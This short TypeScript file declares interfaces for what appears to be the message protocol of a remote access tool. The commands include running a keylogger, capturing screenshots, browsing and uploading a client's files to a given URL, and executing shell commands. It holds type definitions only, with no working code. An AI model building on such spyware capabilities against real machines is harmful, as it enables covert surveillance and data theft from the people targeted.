namespace WS {
	export interface RunKeyLogger {
		status: boolean;
	}
	export interface GetScreenshot {
		screenid: string;
	}
	export interface GetFilesFolder {
		folder: Folders;
		relativepath: string;
	}

	export interface GetFileFromClient {
		fileroute: string;
		upload_url: string;
	}

	export interface UploadFile {
		fileroute: string;
	}

	export interface RunCmdCommand {
		command: string;
	}
}
